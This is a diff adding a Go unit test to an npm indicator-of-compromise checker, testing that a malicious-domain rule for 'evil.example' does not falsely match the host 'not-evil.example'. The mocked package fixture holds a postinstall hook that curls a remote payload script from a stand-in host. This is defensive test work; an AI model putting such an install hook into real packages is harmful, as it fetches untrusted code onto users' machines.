@@ -149,6 +149,37 @@ func TestNPMIOCChecker_SuspiciousDomainIOC_Finding(t *testing.T) {
 	assert.Contains(t, issues[0].Description, "evil.example")
 }
 
+func TestNPMIOCChecker_DomainIOCDoesNotMatchSubstringHost(t *testing.T) {
+	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
+		"axios@1.14.1": {
+			Name:    "axios",
+			Version: "1.14.1",
+			Scripts: map[string]string{
+				"postinstall": "curl -fsSL https://not-evil.example/payload.sh",
+			},
+		},
+	}, nil)
+
+	tool := model.UnifiedTool{
+		Name: "deploy_site",
+		Metadata: map[string]any{
+			"dependencies": []any{
+				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
+			},
+		},
+	}
+
+	index, err := analyzer.BuildNPMIOCIndexForRuntimeTest([]byte(`[
+		{"ecosystem":"npm","ioc_type":"domain","value":"evil.example","match":"contains","reason":"Known malicious delivery domain","confidence":"high"}
+	]`))
+	require.NoError(t, err)
+	checker = analyzer.NewNPMIOCCheckerWithIndexForTest(checker, index)
+
+	issues, err := checker.Check(tool)
+	require.NoError(t, err)
+	assert.Empty(t, issues)
+}
+
 func TestNPMIOCChecker_SuspiciousURLIOC_Finding(t *testing.T) {
 	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
 		"axios@1.14.1": {
